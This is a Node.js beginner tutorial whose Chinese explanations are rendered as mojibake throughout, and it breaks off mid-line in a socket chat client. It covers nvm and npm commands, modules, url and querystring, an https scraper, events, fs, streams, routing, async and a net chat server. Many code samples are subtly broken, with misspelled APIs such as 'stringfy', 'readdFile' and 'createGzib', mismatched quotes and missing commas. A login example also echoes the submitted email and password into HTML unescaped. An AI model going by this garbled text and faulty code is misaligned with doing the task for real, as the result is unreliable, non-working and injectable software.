å®‰è£…æŒ‡å®šç‰ˆæœ¬ nvm install 8.0.0 # æˆ–å®‰è£…æœ€æ–°çš„ç¨³å®šç‰ˆæœ¬ nvm install --lts # æˆ–å®‰è£…æœ€æ–°çš„ç‰ˆæœ¬ nvm install node # æŸ¥çœ‹å®‰è£…çš„ç‰ˆæœ¬ nvm ls # æŸ¥çœ‹å½“å‰ç‰ˆæœ¬ node -v # åˆ‡æ¢ç‰ˆæœ¬ nvm use 6.11.2 ä½“éªŒä¸€ä¸‹åœ¨ç»ˆç«¯è¿›å…¥nodeå‘½ä»¤è¡Œï¼šnode, ä¹‹åå¯ä»¥è¾“å…¥jsä»£ç äº† åœ¨ç»ˆç«¯é‡Œé¢ï¼Œä¸ç”¨å—åˆ°æµè§ˆå™¨é‡Œé¢çš„ä¸€äº›é™åˆ¶(ä½†æ˜¯æœ¬åœ°ç¯å¢ƒæ²¡æœ‰domå’Œbomçš„æ“ä½œ) æ¯”å¦‚ï¼ŒæŸ¥çœ‹æœ¬åœ°è¿›ç¨‹process æ‰§è¡Œæ–‡ä»¶ï¼šnode index.js ä¸ç”¨æ¯æ¬¡å†™å®Œéƒ½è¿è¡Œå‘½ä»¤æ¥æ‰§è¡Œå®‰è£…nodemon, å®æ—¶ä¾¦æµ‹æ–‡ä»¶çš„å˜åŒ– npm install nodemon -g # å…¨å±€å®‰è£… npmä½¿ç”¨å›½å†…æºï¼š # æ°¸ä¹… npm config set registry https://registry.npm.taobao.org æˆ–å®‰è£…ä½¿ç”¨cnpmå‘½ä»¤ ä½¿ç”¨nodemonï¼š nodemon index.js # è¿™æ ·å°±å¯ä»¥å®æ—¶ä¾¦æµ‹äº† ä½¿ç”¨å…¶ä»–ç‰ˆæœ¬nodeæ¥è¿è¡Œè„šæœ¬ # 1.æŒ‡å®šç‰ˆæœ¬æ¥è¿è¡Œ nvm run 6.1.2 index.js #2.ä½¿ç”¨é…ç½®æ–‡ä»¶ .nvmrc #å†…å®¹ç›´æ¥å†™ç‰ˆæœ¬å·ï¼Œ 6.1.2 # nmp use #æ¥ä¸‹æ¥è¿è¡Œå°±å¯ä»¥äº† node index.js äºŒ. æ¨¡å—(åŒ…)ä¸CommonJS Node.jsä¸‰ç§æ¨¡å— å†…ç½®çš„Node.jsæ¨¡å— const os = require('os') // require è½½å…¥æ¨¡å— console.log(os.hostname()); // æ˜¾ç¤ºä¸»æœºå ç¬¬ä¸‰æ–¹çš„Node.jsæ¨¡å—(https://www.npmjs.com) â€‹ æŠŠåŒ…ç”¨npmå¼•è¿›æ¥ï¼ˆå¯ä»¥åˆ›å»ºé…ç½®æ–‡ä»¶æ¥ç®¡ç†npm init,æ ¹æ®æƒ…å†µå¡«å†™å›æ’¤ï¼Œä¼šè‡ªåŠ¨åˆ›å»ºpackage.jsonï¼‰ â€‹ åœ¨å‘½ä»¤è¡Œè¾“å…¥npm install request --save å®‰è£…åœ¨é…ç½®ä¿¡æ¯çš„ä¾èµ–dependenciesé‡Œ â€‹ ä¼šåœ¨æˆ‘ä»¬çš„åŒ…é‡Œé¢è‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹node_modules, æˆ‘ä»¬å®‰è£…çš„åŒ…å°±ä¼šåœ¨é‡Œé¢äº† â€‹ è½½å…¥æ¨¡å—åŒä¸Š â€‹ ç„¶åå¼€å§‹ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¨¡å— const request = require('request') //è‡ªåŠ¨å…ˆä»è‡ªå·±çš„æ¨¡å—æ‰¾ï¼Œæ‰¾ä¸åˆ°å°±ä¼šåˆ°æˆ‘ä»¬ç›®å½•ä¸‹é…ç½®æ–‡ä»¶å¤¹ä¸‹æ‰¾ request({ url: 'https://api.douban.com/v2/movies/top250', json:true, }, (error, response, body) => { console.log(JSON.stringfy(body, null, 2)); }); è‡ªå®šä¹‰çš„Node.jsæ¨¡å—ï¼ˆè¦æŒ‰ç…§CommonJSè§„èŒƒï¼‰ æ–°å»ºä¸€ä¸ªç›®å½•src,é‡Œé¢æ–°å»ºä¸€ä¸ªjsæ–‡ä»¶(æ¨¡å—) //è‡ªå®šä¹‰æ¨¡å— const hello = () =>{ console.log("hello~"); } //æš´éœ²æ¥å£ä¾›å¤–éƒ¨ä½¿ç”¨(ç¬¬ä¸€ä¸ªhelloæ˜¯æ¨¡å—çš„åå­—ï¼Œç¬¬äºŒä¸ªhelloæ˜¯è¦ç”¨çš„æ–¹æ³•) module.exports.hello = hello è°ƒç”¨ const greet = require("./src/greeting.js") greet.hello() ä¸‰. NPM-åŒ…ç®¡ç†å·¥å…·npmä½¿ç”¨npm -v npm info é•œåƒæº # æŸ¥çœ‹ npm config get registry # è®¾ç½® npm config set registry http://registry.npmjs.org å‡çº§node # npm install n -g æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹å®‰è£…äº†å“ªäº›nodeåŒ… npm ls æŸ¥çœ‹å½“å‰npmç”¨æˆ· npm whoami npmæ¸…ç†ç¼“å­˜ npm cache clean -f npmå®‰è£…æ¨¡å— # i = install npm i forever -g # å…¨å±€ npm install xxx # åˆ©ç”¨ npm å®‰è£…xxxæ¨¡å—åˆ°å½“å‰å‘½ä»¤è¡Œæ‰€åœ¨ç›®å½•ï¼› npm install -g xxx # åˆ©ç”¨npmå®‰è£…å…¨å±€æ¨¡å—xxxï¼› npm install xxx # å®‰è£…ä½†ä¸å†™å…¥package.jsonï¼› npm install xxx â€“save # å®‰è£…å¹¶å†™å…¥package.jsonçš„â€dependenciesâ€ä¸­ï¼› npm install xxx â€“save-dev # å®‰è£…å¹¶å†™å…¥package.jsonçš„â€devDependenciesâ€ä¸­ã€‚ npm åˆ é™¤æ¨¡å— npm uninstall xxx # åˆ é™¤xxxæ¨¡å—ï¼› npm uninstall -g xxx # åˆ é™¤å…¨å±€æ¨¡å—xxxï¼› æ›´æ–°æ¨¡å— npm update æ£€æŸ¥æ¨¡å—æ˜¯å¦å·²ç»è¿‡æ—¶ npm outdated åœ¨é¡¹ç›®ä¸­å¼•å¯¼åˆ›å»ºä¸€ä¸ªpackage.jsonæ–‡ä»¶ npm init å‘å¸ƒæ¨¡å— npm publish æŸ¥çœ‹nodeå®‰è£…è·¯å¾„ æŸ¥çœ‹nodeå®‰è£…è·¯å¾„ npm scripts é…ç½®æ–‡ä»¶ä¸­ "scripts": { "test": "echo \"Error: no test sspecified\" &amp;&amp; exit 1" "build": "node async.js" }, æŒ‰ç…§ä¸Šé¢é…ç½®å®Œä¹‹åï¼Œè¿è¡Œåªéœ€ï¼šnpm run build ä¼˜ç‚¹ï¼š åŠŸèƒ½ç›¸åŒï¼Œå¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªè„šæœ¬ è¯¦ç»†çš„ä¸‹æ¥æŸ¥æ–‡æ¡£ å››.æ·±å…¥æµ…å‡ºNodeæ ¸å¿ƒæ¨¡å—API1). url è®°å¾—è¦å¯¼å…¥æ¨¡å— 1.parseurl.parse(urlStr, [parseQueryString], [slashesDenoteHost]) url.parse("https://www.baidu.com") # äº•å·åé¢æ˜¯hash url.parse("https://www.baidu.com:8080/api.php?from=xp&amp;course=node#level") #ç¬¬äºŒä¸ªå‚æ•° parseQueryString ä¸ºtrueæ—¶å°†ä½¿ç”¨æŸ¥è¯¢æ¨¡å—åˆ†ææŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œé»˜è®¤ä¸ºfalse url.parse("https://www.baidu.com"ï¼Œ true) #ç¬¬ä¸‰ä¸ªå‚æ•° å¦‚æœè®¾ç½®æˆtrueï¼Œ//foo/bar å½¢å¼çš„å­—ç¬¦ä¸²å°†è¢«è§£é‡Šæˆ { host: â€˜foo', pathname: â€˜/bar' } url.parse("https://www.baidu.com"ï¼Œ true,true) 2.formatå°†ä¸€ä¸ªè§£æåçš„URLå¯¹è±¡ã€è½¬æˆã€ä¸€ä¸ªæ ¼å¼åŒ–çš„URLå­—ç¬¦ä¸²ã€‚ url.format(urlObj) var url = require('url'); var a = url.format({ protocol : 'http' , auth : null , host : 'example.com:8080' , port : '8080' , hostname : 'example.com' , hash : null , search : '?a=index&amp;t=article&amp;m=default', query : 'a=index&amp;t=article&amp;m=default', pathname : '/one', path : '/one?a=index&amp;t=article&amp;m=default', href : 'http://example.com:8080/one?a=index&amp;t=article&amp;m=default' }); console.log(a); //è¾“å‡ºç»“æœï¼šhttp://example.com:8080/one?a=index&amp;t=article&amp;m=default 3.resolveä¸ºURLæˆ– href æ’å…¥ æˆ– æ›¿æ¢åŸæœ‰çš„æ ‡ç­¾ï¼Œä¸¤æ®µè§£ææˆä¸€ä¸ªå®Œæ•´çš„url url.resolve(from, to) var url = require('url'); var a = url.resolve('/one/two/three', 'four') , b = url.resolve('http://example.com/', '/one'), c = url.resolve('http://example.com/one', '/two'); console.log(a +","+ b +","+ c); //è¾“å‡ºç»“æœï¼š ///one/two/four //http://example.com/one //http://example.com/two 2). QueryString1.querystring.escape(str)è½¬ä¹‰ä¸ºurlç¼–ç  querystring.escape('&lt;å¤§å®¶å¥½>') 2.querystring.unescape(str)åè½¬ä¹‰ querystring.unescape('%3C%E5%A4%A7%E5%AE%B6%E5%A5%BD%3E') 3.querystring.stringify(obj,[, seq[, eq[, options]]])åºåˆ—åŒ– 1. querystring.stringify({name:'chenshuai',ago:21,job:"web"}) 2. querystring.stringify({name:'chenshuai',ago:21,job:"web"},".") //ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥ä¿®æ”¹è¿æ¥çš„&amp; 3. querystring.stringify({name:'chenshuai',ago:21,job:"web"},".",":")//ç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥ä¿®æ”¹keyä¸valueä¹‹é—´çš„å­—ç¬¦ä¸² 4.querystring.parse(str[, sep[, eq[, options]]])ååºåˆ—åŒ– // querystring.parse('å­—ç¬¦ä¸²','&amp;','=') //é»˜è®¤çŠ¶æ€(å­—ç¬¦ä¸²,åˆ†éš”ç¬¦,é”®ä¸å€¼) 1. querystring.parse('name=chenshuai&amp;ago=21&amp;job=web') 2.querystring.parse('name=chenshuai.ago=21.job=web','.')//è¿”åºåˆ—åŒ–æ—¶è¦æ³¨æ„æ ¼å¼ 3.querystring.parse('name:chenshuai.ago:21.job:web','.',':') 3).http(s) æ¨¡å—1.getæ–¹æ³•æ¡ˆä¾‹ï¼Œhttpå°çˆ¬è™« var http = require('http') var https = require('https') //httpsç½‘ç«™ä½¿ç”¨(å’Œhttpçš„æ–¹æ³•æ˜¯ä¸€æ ·çš„) var cherio = require('cherio') // ç±»ä¼¼äºjQuery var url = "https://www.lagou.com" // è§£ææºä»£ç  function parseMenu(html){ //å…ˆå¯¼å…¥htmlï¼Œç„¶åå†è¿›è¡Œå¤„ç† var $ = cherio.load(html) var menu = $('.category-list') var menuData = [] menu.each(function(index,value){ //éå† var menuTitle = $(value).find('h2').text() //ä¸€çº§æ ‡é¢˜ var menuLists = $(value).find('a') var menuList = [] menuLists.each(function(inde, val){ //éå† menuList.push($(val).text()) //aå…ƒç´ çš„text }) menuData.push({ menuTitle:menuTitle, menuList:menuList }) }) return menuData } //æ‰“å° function printMenu(menu) { menu.forEach(function(val){ console.log(val.menuTitle + '\n'); val.menuList.forEach(function(value){ console.log(value); }) }) } // getè¯·æ±‚ https.get(url, function(res){ var html = ''; res.on('data', function(data){ html += data; }) res.on('end', function(){ // æ‰“å°çš„æ˜¯ç½‘é¡µæºä»£ç  //console.log(html); var result = parseMenu(html) printMenu(result) }) res.on('error', function(err){ console.log(err); }) }) 2.Requestæ–¹æ³•GETè·å–å¼‚æ­¥æ•°æ® //Httpæ¨¡å—çš„requestæ–¹æ³•çš„getæ¥è·å–å¼‚æ­¥æ•°æ® è±†ç“£ç”µå½±Top250 const https = require('https') var options = { hostname: 'douban.uieee.com', port: 443, method: 'GET', path: '/v2/movie/top250' } var responseData = '' var request = https.request(options, (response) =>{ response.setEncoding('utf8') response.on('data', (chunk)=>{ responseData += chunk }) response.on('end',()=>{ JSON.parse(responseData).subjects.map((item) =>{ console.log(item.title); // ç¬¬ä¸€é¡µçš„ç”µå½±æ ‡é¢˜ }) }) }) request.on('error', (error)=>{ console.log(error); }) request.end() POSTæ–¹æ³•æäº¤è¡¨å• //Httpæ¨¡å—çš„requestæ–¹æ³•çš„postæ–¹æ³•æäº¤è¡¨å• const http = require('http') const qs = require('querystring') //åºåˆ—åŒ– var postData = querystring.stringfy({ 'question[title]':'å“ˆå“ˆå“ˆ', 'question[content]':'æˆ‘çš„å†…å®¹' }) var options = { hostname: 'www.codingke.com', port: 80, method: 'POST', path: '/ajax/course/question' headers: { // å› ä¸ºç™»å½•ä¹‹åæ‰èƒ½æäº¤ï¼Œæ‰€æœ‰è¿™é‡Œ... 'Cookie':'xxxx', 'User-Agent':'xxxx', 'xxx':'xxx', 'Content-Length':postData.length } } var request = http.request(options, (res) =>{ console.log('Status:' + res.statusCode); res.setEncoding('utf8') res.on('data', (chunk)=>{ console.log(chunk); }) res.on('end',()=>{ console.log("è¡¨å•æäº¤å®Œæ¯•"); }) }) //æäº¤è¡¨å• request.write(postData) request.on('error', (error)=>{ console.log(error); }) request.end() 4). Eventsäº‹ä»¶æ¨¡å—ä½¿ç”¨äº‹ä»¶: EventEmitterç±» äº‹ä»¶çš„å‚æ•° åªæ‰§è¡Œä¸€ä¸ªçš„äº‹ä»¶ç›‘å¬å™¨ æ¯”å¦‚ï¼šæ›´æ–°ã€å‘å¸ƒ éƒ½æ˜¯ä¸€ä¸ªäº‹ä»¶ å°ä¾‹å­: const EventEmitter = require('events') class Player extends EventEmitter{} //ç»§æ‰¿ç±» //å®ä¾‹åŒ–å¯¹è±¡ var player = new Player() //è‡ªå®šä¹‰ä¸€ä¸ªå‡½æ•°(ä¸è¿‡æˆ‘è¿™é‡Œæ˜¯ç”¨çš„åŒ¿åå‡½æ•°) function ev1(){ console.log("å˜»å˜»"); } //ç›‘å¬äº‹ä»¶(è¿™é‡Œç”¨çš„åŒ¿åå‡½æ•°) player.on('play', (track)=>{ console.log(`æ­£åœ¨æ’­æ”¾: ã€Š${track}ã€‹`); }) // emitè®¢é˜…äº‹ä»¶ï¼Œä¼ é€’å‚æ•° player.emit('play',"è¢«é£å¹è¿‡çš„å¤å¤©") //äº‹ä»¶å®šä¹‰ä¹‹åï¼Œå¯ä»¥å¤šæ¬¡è§¦å‘ player.emit('play',"æœ‹å‹è¯·å¬å¥½") // once ä¸è®ºä½ å®šä¹‰å‡ æ¬¡ï¼Œåªä¼šè§¦å‘ä¸€æ¬¡ player.once('play',"é™ˆæƒ…ä»¤") // removeListener ç§»é™¤æŒ‡å®šçš„ç›‘å¬äº‹ä»¶ //player.removeListener('') // removeAllListeners ç§»é™¤æ‰€æœ‰çš„ç›‘å¬äº‹ä»¶ // eventNamesæ–¹æ³•å¯ä»¥ç½—åˆ—å‡ºå·²æ³¨å†Œçš„æ‰€æœ‰ç›‘å¬å™¨çš„äº‹ä»¶ï¼Œç±»å‹ä¸ºæ•°ç»„ 5). fs æ–‡ä»¶ç³»ç»Ÿå¾—åˆ°æ–‡ä»¶ä¸ç›®å½•ä¿¡æ¯ï¼šstat åˆ›å»ºä¸€ä¸ªç›®å½•ï¼šmkdir åˆ›å»ºæ–‡ä»¶å¹¶å†™å…¥å†…å®¹ï¼šwriteFile,appendFile è¯»å–æ–‡ä»¶çš„å†…å®¹ï¼šreadFile åˆ—å‡ºç›®å½•çš„ä¸œè¥¿ï¼šreaddir é‡å‘½åç›®å½•æˆ–æ–‡ä»¶ï¼šrename åˆ é™¤ç›®å½•ä¸æ–‡ä»¶ï¼šrndir,unlink const fs = require('fs') fs.stat('index.js', (error,stats) => { if(error){ console.log(error); }else{ console.log(stats); //æ‰“å°æ–‡ä»¶çš„ä¸€äº›ä¿¡æ¯ console.log(`æ–‡ä»¶ï¼š${stats.isFile()}`); console.log(`ç›®å½•ï¼š${stats.isDirectory()}`); } }) //æ–°å»ºç›®å½• fs.mkdir('logs' (error) =>{ if(error){ console.log(error); }else{ console.log("æˆåŠŸåˆ›å»ºç›®å½•: logs"); } }) // å¾€æ–‡ä»¶å†™å†…å®¹(å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œå°±å…ˆåˆ›å»º) fs.writeFile('logs/hello.log', "hello ~\n" , (error) =>{ if(error){ console.log(error); }else{ console.log("æˆåŠŸå‘æ–‡ä»¶logs/hello.logå†™å…¥å†…å®¹ "); } }) // ä¿®æ”¹æ–‡ä»¶å†…å®¹ fs.writeFile('logs/hello.log', "ä½ å¥½ ~\n" , (error) =>{ if(error){ console.log(error); }else{ console.log("æˆåŠŸä¿®æ”¹æ–‡ä»¶logs/hello.logå†…å®¹ "); } }) // è¿½åŠ æ–‡ä»¶å†…å®¹ fs.appendFile('logs/hello.log', "æ–°æ·»åŠ çš„ä¸€è¡Œ ~\n" , (error) =>{ if(error){ console.log(error); }else{ console.log("æˆåŠŸæ·»åŠ å†…å®¹æ–‡ä»¶logs/hello.log "); } }) // è¯»å–æ–‡ä»¶å†…å®¹ fs.readdFile('logs/hello.log','utf8', (error,data) =>{ if(error){ console.log(error); }else{ console.log("æˆåŠŸè¯»å–æ–‡ä»¶logs/hello.logå†…å®¹"); console.log(data); //console.log(data.toString()); } }) // è¯»å–æ–‡ä»¶å¤¹åˆ—è¡¨ fs.readdir('logs/', (error,data) =>{ if(error){ console.log(error); }else{ console.log("æˆåŠŸè¯»å–æ–‡ä»¶å¤¹logs/åˆ—è¡¨ "); console.log(data); //console.log(data.toString()); } }) //å¯¹æ–‡ä»¶é‡å‘½å ã€ä¿®æ”¹æ–‡ä»¶å¤¹åå­—ä¸€æ · fs.rename('logs/hello.log', "logs/hello_new.log" , (error) =>{ if(error){ console.log(error); }else{ console.log('é‡å‘½åæ–‡ä»¶ålogs/hello.log "); } }) //å¾ªç¯åˆ é™¤æ–‡ä»¶ fs.readdirSync('logs').map((file) =>{ fs.unlink(`logs/${file}`, (error) =>{ if(error){ console.log(error); }else{ console.log(`æˆåŠŸåˆ é™¤æ–‡ä»¶logs/${file}`); } }) }) //åˆ é™¤æ–‡ä»¶å¤¹ fs.rmdir('logs', (error) =>{ if(error){ console.log(error); }else{ console.log('æˆåŠŸåˆ é™¤ç›®å½•:logs/ "); } }) 6). Streamæ–‡ä»¶æµ const fs = require('fs') var fileReadStrem = fs.createReadStream('data.json') var fileWriteStrem = fs.createWriteStream('data1.json') var count = 0; //è¯»å–æ–‡ä»¶æµ fileReadStrem.once('data', (chunk) => { console.log(chunk.toString()); }) fileReadStrem.on('data', (chunk) => { console.log(`${ ++count } æ¥æ”¶åˆ°ï¼š${chunk.length}`); //å†™å…¥æ–‡ä»¶æµ fileWriteStrem.write(chunk) }) fileReadStrem.on('end', () => { console.log("-- ç»“æŸ --"); }) fileReadStrem.on('error', (error) => { console.log(error); }) pipe const fs = require('fs') const zlib = require('zlib') var fileReadStrem = fs.createReadStream('data.json') var fileWriteStrem = fs.createWriteStream('data1.json') fileWriteStrem.on('pipe', (source) => { console.log(source); //å°†å†™å…¥çš„å†…å®¹é€šè¿‡ç®¡é“æ‰“å°ä¸€ä¸‹ }) //è¯»å–æ–‡ä»¶æµçš„å†…å®¹æ”¾åˆ°æ–‡ä»¶å†™å…¥æµ ç®¡é“ fileReadStrem .pipe(zlib.createGzib()) .pipe(fileWriteStrem) äº”.ä½¿ç”¨Nodeåˆ›å»ºåç«¯è·¯ç”±ä½¿ç”¨supervisorè¿è¡Œ # å®‰è£…ï¼š npm install supervisor -g # è¿è¡Œ supervisor router_1.js æœ€ç®€å•è·¯ç”± router_1.js var http = require('http') var url = require('url') var route = require('./modules/route.js') http.createServer((req, res) => { res.writeHead(200, {'Content-Type':'text/html;charset=utf-8'}) if(req.url !== '/favicon.ico'){ var pathName = url.parse(req.url).pathname.replace(/\//,'') //http://localhost:8000/loginå°±æ˜¯login console.log(pathName); try{ //æœ€ç®€å•çš„å¼‚å¸¸å¤„ç† route[pathName](req, res) } catch(err){ route['home'](req, res) //é»˜è®¤è·¯ç”±ï¼Œå¦‚æœä¸å­˜åœ¨å“ªä¸ªè·¯ç”±ï¼Œå°±è¿”å›è¿™ä¸ªè·¯ç”± } } res.end() }).listen(8000) console.log('Server running at http://localhost:8000'); route.js module.exports = { home: (req, res) => { res.write("æ¬¢è¿æ¥åˆ°é¦–é¡µ") // é»˜è®¤è·¯ç”± }, login: (req, res) => { res.write("ç™»å½•ç•Œé¢") // å¤„ç†è·¯ç”± }, registor: (req, res) => { res.write("æ³¨å†Œç•Œé¢") // å¤„ç†è·¯ç”± } } è¯»å–å›¾ç‰‡ router_02.js var http = require('http') var url = require('url') var route = require('./modules/route.js') http.createServer((req, res) => { res.writeHead(200, {'Content-Type':'image/jpeg'}) if(req.url !== '/favicon.ico'){ var pathName = url.parse(req.url).pathname.replace(/\//,'') //http://localhost:8000/loginå°±æ˜¯login console.log(pathName); try{ //æœ€ç®€å•çš„å¼‚å¸¸å¤„ç† route[pathName](req, res) } catch(err){ route['home'](req, res) //é»˜è®¤è·¯ç”±ï¼Œå¦‚æœä¸å­˜åœ¨å“ªä¸ªè·¯ç”±ï¼Œå°±è¿”å›è¿™ä¸ªè·¯ç”± } } //res.end() }).listen(8000) console.log('Server running at http://localhost:8000'); route.js var file = require('./file.js') module.exports = { home: (req, res) => { res.write("æ¬¢è¿æ¥åˆ°é¦–é¡µ") // é»˜è®¤è·¯ç”± }, login: (req, res) => { res.write("ç™»å½•ç•Œé¢") // å¤„ç†è·¯ç”± }, registor: (req, res) => { res.write("æ³¨å†Œç•Œé¢") // å¤„ç†è·¯ç”± }, img: (req, res) => { //è¯»å–æ–‡ä»¶ï¼Œä¹Ÿæ–°å»ºä¸€ä¸ªæ¨¡å— file.readImg('./images/1.jpg', res) } } file.js var fs = require('fs') module.exports = { readImg: (file, res) => { fs.readFile(file, 'binary', (err, data) => { if(err) throw err; res.writeHead(200, {'Content-Type':'image/jpeg'}) res.write(data, 'binary') res.end() }) } } æ–‡å­—å’Œå›¾ç‰‡ä¸€èµ·æ˜¾ç¤º ä½¿ç”¨htmlæ–‡ä»¶ views/home.html &lt;!&lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset="utf-8"> &lt;title>é¦–é¡µ&lt;/title> &lt;/head> &lt;body> é¦–é¡µ &lt;img src="./img" alt=""> &lt;/body> &lt;/html> file.js var fs = require('fs') //è¯»htmlæ–‡ä»¶ module.exports = { readFile: (file, res) => { fs.readFile(file, 'utf-8', (err, data) => { if(err) throw err; res.writeHead(200, {'Content-Type':'text/html; charset=utf-8'}) res.write(data) res.end() })}, readImg: (file, res) => { fs.readFile(file, 'binary', (err, data) => { if(err) throw err; res.writeHead(200, {'Content-Type':'image/jpeg'}) res.write(data, 'binary') res.end() }) } } route.js var file = require('./file.js') module.exports = { home: (req, res) => { //res.write("æ¬¢è¿æ¥åˆ°é¦–é¡µ") // é»˜è®¤è·¯ç”± file.readFile('./views/home.html', res) }, login: (req, res) => { res.write("ç™»å½•ç•Œé¢") // å¤„ç†è·¯ç”± }, registor: (req, res) => { res.write("æ³¨å†Œç•Œé¢") // å¤„ç†è·¯ç”± }, img: (req, res) => { //è¯»å–æ–‡ä»¶ï¼Œä¹Ÿæ–°å»ºä¸€ä¸ªæ¨¡å— file.readImg('./images/1.jpg', res) } } router_03.js var http = require('http') var url = require('url') var route = require('./modules/route.js') http.createServer((req, res) => { if(req.url !== '/favicon.ico'){ var pathName = url.parse(req.url).pathname.replace(/\//,'') console.log(pathName); try{ //æœ€ç®€å•çš„å¼‚å¸¸å¤„ç† route[pathName](req, res) } catch(err){ route['home'](req, res) //é»˜è®¤è·¯ç”±ï¼Œå¦‚æœä¸å­˜åœ¨å“ªä¸ªè·¯ç”±ï¼Œå°±è¿”å›è¿™ä¸ªè·¯ç”± } } //res.end() }).listen(8000) console.log('Server running at http://localhost:8000'); è·¯ç”±ä¼ é€’å‚æ•°1.getæ–¹å¼ login.html &lt;form action="./login" method="get"> &lt;label for="email"> é‚®ç®±: &lt;input type="text" name="email" value=""/> &lt;/label> &lt;label for="password"> å¯†ç : &lt;input type="password" name="password" value=""/> &lt;/label> &lt;label for="submit"> &lt;input type="submit" value="æäº¤" /> &lt;/label> toute.js var file = require('./file.js') var url = require('url') module.exports = { login: (req, res) => { var urlObject = url.parse(req.url, true).query // é€šè¿‡urlè§£æhtmlè¡¨å•æ•°æ® console.log(urlObject.email) console.log(urlObject.password) file.readFile('./views/login.html', res, req) } } 2.postæ–¹å¼ route.js var file = require('./file.js') var url = require('url') var queryString = require('queryString') module.exports = { login: (req, res) => { //postæ–¹å¼ var post = '' req.on('data', (chunk) => { post += chunk }) req.on('end', () => { var urlObject = queryString.parse(post) //è¿”å›ä¸€ä¸ªurlå¯¹è±¡ console.log(urlObject.email); console.log(urlObject.password); }) file.readFile('./views/login.html', res, req) } } è¾“å…¥çš„å†…å®¹å›æ˜¾åˆ°æœ¬é¡µé¢ file.js postReadFile: (file, res, req, post) =>{ var urlObject = queryString.parse(post) var array = ['email', 'password'] var reg; fs.readFile(file, 'utf-8', (err, data) => { if(err) throw err; res.writeHead(200, {'Content-Type':'text/html; charset=utf-8'}) //å¤„ç† for(var i=0; i&lt;array.length; i++){ reg = new RegExp('{' + array[i] + '}', 'gi') data = data.replace(reg, urlObject[array[i]]) } if(urlObject.email &amp;&amp; urlObject.password){ data = data.replace(new RegExp('{infoClass}', 'gi'), '') data = data.replace(new RegExp('{formClass}', 'gi'), 'hide') }else{ data = data.replace(new RegExp('{infoClass}', 'gi'), 'hide') data = data.replace(new RegExp('{formClass}', 'gi'), '') } res.write(data) res.end() }) }, route.js login: (req, res) => { //postæ–¹å¼ var post = ''; req.on('data', (chunk) => { post += chunk }) req.on('end', () => { file.postReadFile('./views/login.html', res, req, post) }) }, login.html &lt;div class="{infoClass}"> Email:{email} &lt;br> å¯†ç :{password} &lt;/div> &lt;form action="./login" method="post" class="formClass"> &lt;label for="email"> é‚®ç®±: &lt;input type="text" name="email" value=""/> &lt;/label> &lt;label for="password"> å¯†ç : &lt;input type="password" name="password" value=""/> &lt;/label> &lt;label for="submit"> &lt;input type="submit" value="æäº¤" /> &lt;/label> asyncnpm install async -D å¸¸ç”¨åŠŸèƒ½: //1.ä¸²è¡Œæ— å…³è”(ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ•°ç»„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸ªå›è°ƒå‡½æ•°) //è¿è¡Œæ—¶é—´æ˜¯ä¸¤ä¸ªè¿è¡Œæ—¶é—´æ€»å’Œ console.time('test') async.series([ (callback) => { //æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  setTimeout(()=>{ callback(null,'one') },200) }, (callback)=>{ //æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  setTimeout(()=>{ callback(null,'two') },5000) } ], (err, results) => { // ç¬¬äºŒä¸ªå‚æ•° console.log(results); console.timeEnd('test') //çœ‹ä¸€ä¸‹æ‰§è¡Œæ—¶é—´ } ) // 2.ä¸²è¡Œæ— å…³è”(ç¬¬äºŒç§ç”¨æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯¹è±¡) console.time('test') async.series({ one: (callback) => { setTimeout(() => { callback(null, '1') },2000) }, two: (callback) => { setTimeout(() => { callback(null, '2') ,3000) } }, (err, results) => { console.log(results); console.timeEnd('test') }) // 3.å¹¶è¡Œæ— å…³è”ï¼ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ•°ç»„ï¼‰ //æ—¶é—´å–æœ€é•¿çš„ async.parallel([ (callback) => { setTimeout( ()=>{ callback(null, 'one') },2000) }, (callback) => { setTimeout( ()=>{ callback(null, 'two') },5000) }, ], (err,results)=>{ console.log(results); console.timeEnd('test') //è¿è¡Œæ—¶é—´5sï¼Œå–æœ€é•¿çš„ }) //ä¹Ÿå¯ä»¥ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯¹è±¡ // 4.ä¸²è¡Œæœ‰å…³è” async.waterfall([ function (callback){ callback(null,'one','two') }, function (arr1,arr2,callback){ callback(null, arr1,arr2,'three') }, function (arr1,arr2,arr3,callback){ callback(null, [arr1,arr2,arr3,'done']) } ],function(err,results){ console.log(results); }) //è¿™é‡Œæ²¡åŠ å¼‚æ­¥ï¼ŒæŒ‰ç…§ä¸²è¡Œé¡ºåºä¾æ¬¡ä¸‹æ¥çš„ å…­. Socket 1). åŸºäºnetæ¨¡å—å®ç°socketèŠå¤©æ¡ˆä¾‹ server.js var net = require('net') var chatServer = net.createServer(), clientMap = new Object() var i = 0; //å®¢æˆ·ç«¯è¿æ¥æµæ°´å· chatServer.on('connection', function (client){ client.name = ++i clientMap[client.name] = client console.log("å®¢æˆ·ç«¯ "+ client.name +" è¿æ¥æˆåŠŸ~"); //å¯¹å®¢æˆ·ç«¯å‘é€æ¶ˆæ¯çš„ç›‘å¬ client.on('data', function (data){ console.log("å®¢æˆ·ç«¯ä¼ æ¥ï¼š" + data); broadcast(data, client) //å¹¿æ’­ç»™å…¶ä»– }) //æ•°æ®é”™è¯¯çš„å¤„ç† client.on('error', function (err){ console.log("client error: " + err); client.end() }) //å®¢æˆ·ç«¯å…³é—­äº‹ä»¶ client.on('close', function (data){ delete clientMap[client.name] console.log(client.name + "ä¸‹çº¿äº†"); broadcast(client.name+"ä¸‹çº¿äº†", client) //å¹¿æ’­ç»™å…¶ä»– }) }) chatServer.listen(9000) //ç›‘å¬ç«¯å£ //æ¶ˆæ¯å¹¿æ’­ function broadcast (message, client){ for(var key in clientMap){ clientMap[key].write(client.name + ' say:' + message + "\n") } } client.js var net = require('net') var port = 9000 var host = 